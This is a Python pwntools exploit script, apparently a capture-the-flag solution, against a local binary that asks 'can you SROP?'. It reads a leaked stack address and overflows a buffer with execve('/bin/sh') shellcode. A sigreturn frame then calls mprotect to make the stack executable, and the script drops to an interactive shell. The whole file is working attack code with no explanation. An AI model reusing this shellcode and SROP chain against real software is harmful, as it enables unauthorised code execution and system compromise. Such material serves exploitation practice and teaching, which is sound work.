from pwn import *

r = process("./a.out")
#gdb.attach(r)


stuff = r.recvuntil(b'can you SROP?').split(b'@')[1][:14]
buf_addr = int(stuff, 16)
stack_addr = buf_addr & 0xfffffffff000


print(hex(stack_addr))

gadget_rax = 0x40116c
gadget_syscall_ret = 0x40115e

shellcode = b"\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\x89\xE7\x48\xC7\xC0\x3B\x00\x00\x00\x48\x31\xF6\x48\x31\xD2\x0F\x05"

payload = shellcode
payload += b"a"*(0x78 - len(payload))

payload += p64(gadget_rax) + p64(gadget_syscall_ret)


frame = SigreturnFrame(arch="amd64", kernel="amd64")
frame.rax = 10
frame.rdi = stack_addr
frame.rsi = 0x1000
frame.rdx = 0x7
frame.rip = gadget_syscall_ret
frame.rsp = buf_addr + len(payload) + 0xf8

payload += bytes(frame)
payload += p64(buf_addr)

r.sendline(payload)

r.interactive()


